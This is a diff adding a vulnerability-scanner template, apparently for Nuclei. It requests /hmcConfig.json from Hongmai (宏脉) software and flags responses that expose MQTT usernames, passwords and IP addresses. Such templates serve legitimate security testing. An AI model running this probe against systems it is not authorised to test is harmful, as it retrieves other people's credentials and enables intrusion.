@@ -1,0 +1,30 @@
+id: hmcsoft-hmcConfig-disclosure
+info:
+  name: 宏脉信息技术hmcConfig存在信息泄露漏洞
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/zan8in/afrog/blob/e7797d9131af41a0fe63b046452bf15a816a4966/pocs/afrog-pocs/vulnerability/hmc-hmcconfig-infoleak.yaml#L4
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: hmcsoft,disclosure
+
+http:
+  - raw:
+      - |
+        GET /hmcConfig.json HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'MQTT_USERNAME','MQTT_PASSWORD','MQTT_IP')
+        condition: and
